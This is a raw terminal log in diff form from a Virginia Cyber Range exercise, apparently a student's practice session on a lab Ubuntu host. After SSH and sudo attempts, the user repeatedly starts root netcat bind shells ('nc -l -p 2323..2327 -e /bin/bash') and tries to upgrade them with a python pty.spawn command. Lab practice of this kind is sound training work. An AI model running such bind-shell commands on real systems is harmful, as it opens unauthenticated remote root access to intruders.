@@ -1,0 +1,186 @@
+__     ___    ____ ____  
+\ \   / / \  / ___|  _ \ 
+ \ \ / / _ \| |   | |_) |
+  \ V / ___ \ |___|  _ < 
+   \_/_/   \_\____|_| \_\
+    VirginiaCyberRange.org
+
+
+student@kali:~$ ssh joe@10.1.44.155
+joe@10.1.44.155's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-1018-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  Get cloud support with Ubuntu Advantage Cloud Guest:
+    http://www.ubuntu.com/business/services/cloud
+
+38 packages can be updated.
+0 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Could not chdir to home directory /home/joe: No such file or directory
+$ ls
+bin   home	      lib64	  opt	sbin  tmp      vmlinuz.old
+boot  initrd.img      lost+found  proc	snap  usr
+dev   initrd.img.old  media	  root	srv   var
+etc   lib	      mnt	  run	sys   vmlinuz
+$ sudo echo test
+[sudo] password for joe: 
+joe is not in the sudoers file.  This incident will be reported.
+$ ^[[A^[[A^[[B^[[B^[[B
+-sh: 3: : not found
+$ sudo echo test
+[sudo] password for joe: 
+joe is not in the sudoers file.  This incident will be reported.
+$ exit
+Connection to 10.1.44.155 closed.
+student@kali:~$ ssh joe@10.1.44.155
+joe@10.1.44.155's password: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-1018-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  Get cloud support with Ubuntu Advantage Cloud Guest:
+    http://www.ubuntu.com/business/services/cloud
+
+38 packages can be updated.
+0 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Tue Mar  3 22:11:33 2020 from 10.1.33.251
+Could not chdir to home directory /home/joe: No such file or directory
+$ sudo echo test
+[sudo] password for joe: 
+test
+$ sudo nc -l -p 2323 -e /bin/bash &
+$ netstat -vat | grep 2323
+tcp        0      0 *:2323                  *:*                     LISTEN     
+tcp        0      0 ip-10-1-44-155.ec2:2323 ip-10-1-33-251.ec:45866 CLOSE_WAIT 
+$ sudo su nc -l -p 2324 -e /bin/bash &
+$ su: invalid option -- 'e'
+Usage: su [options] [LOGIN]
+
+Options:
+  -c, --command COMMAND         pass COMMAND to the invoked shell
+  -h, --help                    display this help message and exit
+  -, -l, --login                make the shell a login shell
+  -m, -p,
+  --preserve-environment        do not reset environment variables, and
+                                keep the same shell
+  -s, --shell SHELL             use SHELL instead of the default in passwd
+
+
+[2] + Done(2)                    sudo su nc -l -p 2324 -e /bin/bash
+$ su -root ^[[D^[[D^[[D
+su: invalid option -- 'r'
+Usage: su [options] [LOGIN]
+
+Options:
+  -c, --command COMMAND         pass COMMAND to the invoked shell
+  -h, --help                    display this help message and exit
+  -, -l, --login                make the shell a login shell
+  -m, -p,
+  --preserve-environment        do not reset environment variables, and
+                                keep the same shell
+  -s, --shell SHELL             use SHELL instead of the default in passwd
+
+$ 
+$ su - root -c nc -l -p 2324 -e /bin/bash &
+$ su: invalid option -- 'e'
+Usage: su [options] [LOGIN]
+
+Options:
+  -c, --command COMMAND         pass COMMAND to the invoked shell
+  -h, --help                    display this help message and exit
+  -, -l, --login                make the shell a login shell
+  -m, -p,
+  --preserve-environment        do not reset environment variables, and
+                                keep the same shell
+  -s, --shell SHELL             use SHELL instead of the default in passwd
+
+
+[2] + Done(2)                    su - root -c nc -l -p 2324 -e /bin/bash
+$ sudo su - root -c nc -l -p 2324 -e /bin/bash &
+$ su: invalid option -- 'e'
+Usage: su [options] [LOGIN]
+
+Options:
+  -c, --command COMMAND         pass COMMAND to the invoked shell
+  -h, --help                    display this help message and exit
+  -, -l, --login                make the shell a login shell
+  -m, -p,
+  --preserve-environment        do not reset environment variables, and
+                                keep the same shell
+  -s, --shell SHELL             use SHELL instead of the default in passwd
+
+
+[2] + Done(2)                    sudo su - root -c nc -l -p 2324 -e /bin/bash
+$ ^[[A^[[B
+-sh: 12: : not found
+$ sudo su - root -c "nc -l -p 2324 -e /bin/bash &"
+$ sudo netstat -vat |grep 2324
+tcp        0      0 *:2324                  *:*                     LISTEN     
+$ bash: line 1: syntax error near unexpected token `“/bin/bash”'
+bash: line 1: `python -c ‘import pty; pty.spawn(“/bin/bash”)’'
+sudo su -: not foundc -l -p 2324 -e /bin/bash &"
+$ ^[[A^[[A
+$ ^[[B6: 
+-sh: 18: : not found
+$ sudo su echo test
+No passwd entry for user 'echo'
+$ ^[[A^[[B
+-sh: 20: : not found
+$ sudo su - root -c 'echo test'
+test
+$ sudo su - root -c "nc -l -p 2325 -e /bin/bash &"
+$ sudo netstat -vat | grep 2325
+tcp        0      0 *:2325                  *:*                     LISTEN     
+$ bash: l: not foundax error near unexpected token `“/bin/bash”'
+$ ^[[A^[[B 2: `python -c ‘import pty; pty.spawn(“/bin/bash”)’'
+-sh: 25: : not found
+$ sudo su - root -c 'echo test'
+test
+$ sudo su - root -c 'nc -l -p 2326 -e /bin/bash &"
+> ^[[B
+> exit
+> -sh: 30: Syntax error: Unterminated quoted string
+$ sudo su - root -c "nc -l -p 2327 -e /bin/bash &"
+$ bash: line 4: $'\E[A\E[B': command not found
+
